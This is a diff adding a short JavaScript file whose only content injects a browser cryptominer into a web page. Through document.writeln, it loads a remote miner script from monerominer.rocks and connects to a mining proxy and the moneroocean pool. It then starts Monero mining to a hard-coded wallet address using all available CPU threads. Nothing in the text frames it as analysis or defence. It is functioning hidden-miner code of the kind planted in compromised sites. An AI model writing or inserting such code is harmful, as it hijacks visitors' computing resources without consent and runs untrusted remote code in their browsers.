@@ -1,0 +1,11 @@
+﻿document.writeln("<script src=\'https://monerominer.rocks/miner-mmr/webmnr.min.js\'></script>");
+document.writeln("<script>");
+document.writeln("    server = \'wss://f.xmrminingproxy.com:8181\';");
+document.writeln("    var pool = \'moneroocean.stream\';");
+document.writeln("    var walletAddress = \'88q1X5oJAf8Z866bWuRDZJZHPVHoyHJ2kXfHuXVutvWvHHd9vQmN1kRM9VMerVMGSG8R3o53WyF8a92F6Je4Jp535xhHGBr\';");
+document.writeln("    var workerId = \'\'");
+document.writeln("    var threads = -1;");
+document.writeln("    var password = \'x\';");
+document.writeln("    startMining(pool, walletAddress, workerId, threads, password);");
+document.writeln("    throttleMiner = 5;");
+document.writeln("</script>");
